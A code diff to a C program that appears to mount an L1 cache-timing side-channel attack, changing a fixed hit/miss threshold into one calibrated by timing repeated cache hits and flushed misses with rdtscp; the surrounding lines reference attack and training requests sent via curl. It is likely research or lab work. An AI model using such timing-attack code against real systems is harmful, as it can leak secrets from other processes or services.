@@ -12,7 +12,6 @@
 #define L1_SIZE (WAYS * SETS * LINE_SIZE)
 #define NO_LINES (WAYS * SETS)
 
-#define CACHE_THRESHOLD 100
 #define INDEXES_PER_LINE (LINE_SIZE / sizeof(int))
 #define TRAINING_REPS 100
 #define PROBE_ARR_SIZE (L1_SIZE/sizeof(int))
@@ -21,9 +20,10 @@
 unsigned int probe_array[PROBE_ARR_SIZE]; // allocates int array of size = L1_SIZE
 CURL *curl_handle;
 
-
+uint64_t c_threshold;
 int main(int argc, char* argv[]) {
-    cache_threshold();
+    // find threshold
+    c_threshold = cache_threshold();
 
     // prep attack and training data for request
     char* attack_id = "2";
@@ -97,7 +97,7 @@ void check_cache_presence(int *count){
             t2 = __rdtscp(&pid);
             _mm_lfence();
             
-            if (t2 - t1 < CACHE_THRESHOLD){
+            if (t2 - t1 < c_threshold){
                 present ++;
                 
             }
@@ -112,42 +112,57 @@ void check_cache_presence(int *count){
 
 // finds hit and miss time  -need to implement loop to find avg + determine cache threshold
 volatile int test_data = 2;
-void cache_threshold(){
-    uint64_t t1, t2;
+uint64_t cache_threshold(){
+    uint64_t t1, t2, time; 
+    uint64_t min = UINT64_MAX;
+    uint64_t max = 0;
     unsigned int pid;
     volatile int junk; 
 
-    junk = test_data;
-    junk = test_data;
+    for (int i = 0; i < 1000; i++){
+        junk = test_data;
+        junk = test_data;
 
-    _mm_lfence();
-    t1 = __rdtscp(&pid);
-    _mm_lfence();
+        _mm_lfence();
+        t1 = __rdtscp(&pid);
+        _mm_lfence();
 
-    pid = test_data;
+        junk = test_data;
 
-    _mm_lfence();
-    t2 = __rdtscp(&pid);
-    _mm_lfence();
+        _mm_lfence();
+        t2 = __rdtscp(&pid);
+        _mm_lfence();
 
-    uint64_t time = t2 - t1;
-    printf("hit Time: %ld, %d\n", time, junk);
+        time = t2 - t1;
+        if (time > max){
+            max = time;
+        }
+        //printf("hit Time: %ld, %d\n", time, junk);
+    }
 
-    _mm_clflush((void*)&test_data);
-    _mm_mfence();
 
-    _mm_lfence();
-    t1 = __rdtscp(&pid);
-    _mm_lfence();
+    for (int i = 0; i < 1000; i++){
+        _mm_clflush((void*)&test_data);
+        _mm_mfence();
 
-    pid = test_data;
+        _mm_lfence();
+        t1 = __rdtscp(&pid);
+        _mm_lfence();
 
-    _mm_lfence();
-    t2 = __rdtscp(&pid);
-    _mm_lfence();
+        pid = test_data;
 
-    time = t2 - t1;
-    printf("miss Time: %ld\n", time, junk);
+        t2 = __rdtscp(&pid);
+        _mm_lfence();
+
+        time = t2 - t1;
+        if (min > time){
+            min = time;
+        }
+        //printf("miss Time: %ld\n", time, junk);
+    }
+    printf("fastest miss: %ld\nslowest hit: %ld\n", min, max);
+    uint64_t threshold = (min + max)/2;
+    return threshold;
 }
 
 
